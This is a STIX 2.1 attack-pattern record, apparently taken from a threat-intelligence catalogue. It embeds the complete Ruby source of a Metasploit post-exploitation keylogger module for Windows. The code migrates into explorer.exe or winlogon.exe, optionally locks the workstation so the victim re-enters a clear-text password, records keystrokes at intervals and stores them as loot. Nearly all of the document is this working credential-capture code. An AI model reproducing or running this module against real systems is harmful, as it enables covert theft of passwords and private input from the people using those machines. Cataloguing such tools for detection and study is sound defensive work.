{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d612d698-8065-4065-844c-910a2d4c27d0",
    "created": "2024-08-14T16:33:13.571069Z",
    "modified": "2024-08-14T16:33:13.571073Z",
    "name": "Windows Capture Keystroke Recorder",
    "description": " This module can be used to capture keystrokes. To capture keystrokes when the session is running as SYSTEM, the MIGRATE option must be enabled and the CAPTURE_TYPE option should be set to one of Explorer, Winlogon, or a specific PID. To capture the keystrokes of the interactive user, the Explorer option should be used with MIGRATE enabled. Keep in mind that this will demote this session to the user's privileges, so it makes sense to create a separate session for this task. The Winlogon option will capture the username and password entered into the logon and unlock dialog. The LOCKSCREEN option can be combined with the Winlogon CAPTURE_TYPE to for the user to enter their clear-text password. It is recommended to run this module as a job, otherwise it will tie up your framework user interface.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/capture/keylog_recorder.rb",
            "external_id": "keylog_recorder.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'English'\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Capture Keystroke Recorder',\n        'Description' => %q{\n          This module can be used to capture keystrokes. To capture keystrokes when the session is running\n          as SYSTEM, the MIGRATE option must be enabled and the CAPTURE_TYPE option should be set to one of\n          Explorer, Winlogon, or a specific PID. To capture the keystrokes of the interactive user, the\n          Explorer option should be used with MIGRATE enabled. Keep in mind that this will demote this session\n          to the user's privileges, so it makes sense to create a separate session for this task. The Winlogon\n          option will capture the username and password entered into the logon and unlock dialog. The LOCKSCREEN\n          option can be combined with the Winlogon CAPTURE_TYPE to for the user to enter their clear-text\n          password. It is recommended to run this module as a job, otherwise it will tie up your framework user interface.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Carlos Perez <carlos_perez[at]darkoperator.com>',\n          'Josh Hale <jhale85446[at]gmail.com>'\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter', ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_migrate\n              stdapi_railgun_api\n              stdapi_sys_config_getuid\n              stdapi_sys_process_attach\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_getpid\n              stdapi_ui_get_keys_utf8\n              stdapi_ui_start_keyscan\n              stdapi_ui_stop_keyscan\n            ]\n          }\n        }\n      )\n    )\n    register_options(\n      [\n        OptBool.new('LOCKSCREEN', [false, 'Lock system screen.', false]),\n        OptBool.new('MIGRATE', [false, 'Perform Migration.', false]),\n        OptInt.new('INTERVAL', [false, 'Time interval to save keystrokes in seconds', 5]),\n        OptInt.new('PID', [false, 'Process ID to migrate to', nil]),\n        OptEnum.new('CAPTURE_TYPE', [\n          false, 'Capture keystrokes for Explorer, Winlogon or PID',\n          'explorer', ['explorer', 'winlogon', 'pid']\n        ])\n\n      ]\n    )\n    register_advanced_options(\n      [\n        OptBool.new('ShowKeystrokes', [false, 'Show captured keystrokes', false]),\n        OptEnum.new('TimeOutAction', [\n          true, 'Action to take when session response timeout occurs.',\n          'wait', ['wait', 'exit']\n        ])\n      ]\n    )\n  end\n\n  def run\n    print_status(\"Executing module against #{sysinfo['Computer']}\")\n    if datastore['MIGRATE']\n      if datastore['CAPTURE_TYPE'] == 'pid'\n        return unless migrate_pid(datastore['PID'], session.sys.process.getpid)\n      else\n        return unless process_migrate\n      end\n    end\n\n    lock_screen if datastore['LOCKSCREEN'] && get_process_name == 'winlogon.exe'\n\n    if start_keylogger\n      @logfile = set_log\n      keycap\n    end\n  end\n\n  # Initial Setup values\n  #\n  # @return [void] A useful return value is not expected here\n  def setup\n    @logfile = nil\n    @timed_out = false\n    @timed_out_age = nil # Session age when it timed out\n    @interval = datastore['INTERVAL'].to_i\n    @wait = datastore['TimeOutAction'] == 'wait'\n\n    if @interval < 1\n      print_error('INTERVAL value out of bounds. Setting to 5.')\n      @interval = 5\n    end\n  end\n\n  # This function sets the log file and loot entry.\n  #\n  # @return [StringClass] Returns the path name to the stored loot filename\n  def set_log\n    store_loot('host.windows.keystrokes', 'text/plain', session, \"Keystroke log from #{get_process_name} on #{sysinfo['Computer']} with user #{client.sys.config.getuid} started at #{Time.now}\\n\\n\", 'keystrokes.txt', 'User Keystrokes')\n  end\n\n  # This writes a timestamp event to the output file.\n  #\n  # @return [void] A useful return value is not expected here\n  def time_stamp(event)\n    file_local_write(@logfile, \"\\nKeylog Recorder #{event} at #{Time.now}\\n\\n\")\n  end\n\n  # This locks the Windows screen if so requested in the datastore.\n  #\n  # @return [void] A useful return value is not expected here\n  def lock_screen\n    print_status('Locking the desktop...')\n    lock_info = session.railgun.user32.LockWorkStation()\n    if lock_info['GetLastError'] == 0\n      print_status('Screen has been locked')\n    else\n      print_error('Screen lock failed')\n    end\n  end\n\n  # This function returns the process name that the session is running in.\n  #\n  # Note: \"session.sys.process[proc_name]\" will not work when \"include Msf::Post::Windows::Priv\" is in the module.\n  #\n  # @return [String Class] the session process's name\n  # @return [NilClass] Session match was not found\n  def get_process_name\n    processes = client.sys.process.get_processes\n    current_pid = session.sys.process.getpid\n    processes.each do |proc|\n      return proc['name'] if proc['pid'] == current_pid\n    end\n    return nil\n  end\n\n  # This function evaluates the capture type and migrates accordingly.\n  # In the event of errors, it will default to the explorer capture type.\n  #\n  # @return [TrueClass] if it successfully migrated\n  # @return [FalseClass] if it failed to migrate\n  def process_migrate\n    captype = datastore['CAPTURE_TYPE']\n\n    if captype == 'winlogon'\n      if is_uac_enabled? && !is_admin?\n        print_error('UAC is enabled on this host! Winlogon migration will be blocked. Exiting...')\n        return false\n      else\n        return migrate(get_pid('winlogon.exe'), 'winlogon.exe', session.sys.process.getpid)\n      end\n    end\n\n    return migrate(get_pid('explorer.exe'), 'explorer.exe', session.sys.process.getpid)\n  end\n\n  # This function returns the first process id of a process with the name provided.\n  # It will make sure that the process has a visible user meaning that the session has rights to that process.\n  # Note: \"target_pid = session.sys.process[proc_name]\" will not work when \"include Msf::Post::Windows::Priv\" is in the module.\n  #\n  # @return [Integer] the PID if one is found\n  # @return [NilClass] if no PID was found\n  def get_pid(proc_name)\n    processes = client.sys.process.get_processes\n    processes.each do |proc|\n      if proc['name'] == proc_name && proc['user'] != ''\n        return proc['pid']\n      end\n    end\n    return nil\n  end\n\n  # This function attempts to migrate to the specified process by Name.\n  #\n  # @return [TrueClass] if it successfully migrated\n  # @return [FalseClass] if it failed to migrate\n  def migrate(target_pid, proc_name, current_pid)\n    if !target_pid\n      print_error(\"Could not migrate to #{proc_name}. Exiting...\")\n      return false\n    end\n\n    print_status(\"Trying #{proc_name} (#{target_pid})\")\n\n    if target_pid == current_pid\n      print_good(\"Already in #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}\")\n      return true\n    end\n\n    begin\n      client.core.migrate(target_pid)\n      print_good(\"Successfully migrated to #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}\")\n      return true\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_error(\"Could not migrate to #{proc_name}. Exiting...\")\n      print_error(e.to_s)\n      return false\n    end\n  end\n\n  # This function attempts to migrate to the specified process by PID only.\n  #\n  # @return [TrueClass] if it successfully migrated\n  # @return [FalseClass] if it failed to migrate\n  def migrate_pid(target_pid, current_pid)\n    if !target_pid\n      print_error(\"Could not migrate to PID #{target_pid}. Exiting...\")\n      return false\n    end\n\n    if !has_pid?(target_pid)\n      print_error(\"Could not migrate to PID #{target_pid}. Does not exist! Exiting...\")\n      return false\n    end\n\n    print_status(\"Trying PID: #{target_pid}\")\n\n    if target_pid == current_pid\n      print_good(\"Already in #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}\")\n      return true\n    end\n\n    begin\n      client.core.migrate(target_pid)\n      print_good(\"Successfully migrated to #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}\")\n      return true\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_error(\"Could not migrate to PID #{target_pid}. Exiting...\")\n      print_error(e.to_s)\n      return false\n    end\n  end\n\n  # This function starts the keylogger\n  #\n  # @return [TrueClass] keylogger started successfully\n  # @return [FalseClass] keylogger failed to start\n  def start_keylogger\n    begin\n      # Stop keyscan if it was already running for some reason.\n      session.ui.keyscan_stop\n    rescue StandardError\n      nil\n    end\n    begin\n      print_status('Starting the keylog recorder...')\n      session.ui.keyscan_start\n      return true\n    rescue StandardError\n      print_error(\"Failed to start the keylog recorder: #{$ERROR_INFO}\")\n      return false\n    end\n  end\n\n  # This function dumps the keyscan and uses the API function to parse\n  # the extracted keystrokes.\n  #\n  # @return [void] A useful return value is not expected here\n  def write_keylog_data\n    output = session.ui.keyscan_dump\n\n    if !output.empty?\n      print_good(\"Keystrokes captured #{output}\") if datastore['ShowKeystrokes']\n      file_local_write(@logfile, \"#{output}\\n\")\n    end\n  end\n\n  # This function manages the key recording process\n  # It stops the process if the session is killed or goes stale\n  #\n  # @return [void] A useful return value is not expected here\n  def keycap\n    rec = 1\n    print_status(\"Keystrokes being saved in to #{@logfile}\")\n    print_status('Recording keystrokes...')\n\n    while rec == 1\n      begin\n        sleep(@interval)\n        if session_good?\n          write_keylog_data\n        elsif !session.alive?\n          vprint_status(\"Session: #{datastore['SESSION']} has been closed. Exiting keylog recorder.\")\n          rec = 0\n        end\n      rescue ::Exception => e\n        if e.class.to_s == 'Rex::TimeoutError'\n          @timed_out_age = get_session_age\n          @timed_out = true\n\n          if @wait\n            time_stamp('timed out - now waiting')\n            vprint_status(\"Session: #{datastore['SESSION']} is not responding. Waiting...\")\n          else\n            time_stamp('timed out - exiting')\n            print_status(\"Session: #{datastore['SESSION']} is not responding. Exiting keylog recorder.\")\n            rec = 0\n          end\n        elsif e.class.to_s == 'Interrupt'\n          print_status('User interrupt.')\n          rec = 0\n        else\n          print_error(\"Keylog recorder on session: #{datastore['SESSION']} encountered error: #{e.class} (#{e}) Exiting...\")\n          @timed_out = true\n          rec = 0\n        end\n      end\n    end\n  end\n\n  # This function returns the number of seconds since the last time\n  # that the session checked in.\n  #\n  # @return [Integer Class] Number of seconds since last checkin\n  def get_session_age\n    return Time.now.to_i - session.last_checkin.to_i\n  end\n\n  # This function makes sure a session is still alive acording to the Framework.\n  # It also checks the timed_out flag. Upon resume of session it resets the flag so\n  # that logging can start again.\n  #\n  # @return [TrueClass] Session is still alive (Framework) and not timed out\n  # @return [FalseClass] Session is dead or timed out\n  def session_good?\n    return false if !session.alive?\n\n    if @timed_out\n      if get_session_age < @timed_out_age && @wait\n        time_stamp('resumed')\n        @timed_out = false # reset timed out to false, if module set to wait and session becomes active again.\n      end\n      return !@timed_out\n    end\n    return true\n  end\n\n  # This function writes off the last set of key strokes\n  # and shuts down the key logger\n  #\n  # @return [void] A useful return value is not expected here\n  def finish_up\n    print_status('Shutting down keylog recorder. Please wait...')\n\n    last_known_timeout = session.response_timeout\n    session.response_timeout = 20 # Change timeout so job will exit in 20 seconds if session is unresponsive\n\n    begin\n      sleep(@interval)\n      write_keylog_data\n    rescue ::Exception => e\n      print_error(\"Keylog recorder encountered error: #{e.class} (#{e}) Exiting...\") if e.class.to_s != 'Rex::TimeoutError' # Don't care about timeout, just exit\n      session.response_timeout = last_known_timeout\n      return\n    end\n    begin\n      session.ui.keyscan_stop\n    rescue StandardError\n      nil\n    end\n    session.response_timeout = last_known_timeout\n  end\n\n  # This function cleans up the module.\n  # finish_up was added for a clean exit when this module is run as a job.\n  #\n  # Known Issue: This appears to run twice when killing the job. Not sure why.\n  # Does not cause issues with output or errors.\n  #\n  # @return [void] A useful return value is not expected here\n  def cleanup\n    if @logfile # make sure there is a log file meaning keylog started and migration was successful, if used.\n      finish_up if session_good?\n      time_stamp('exited')\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}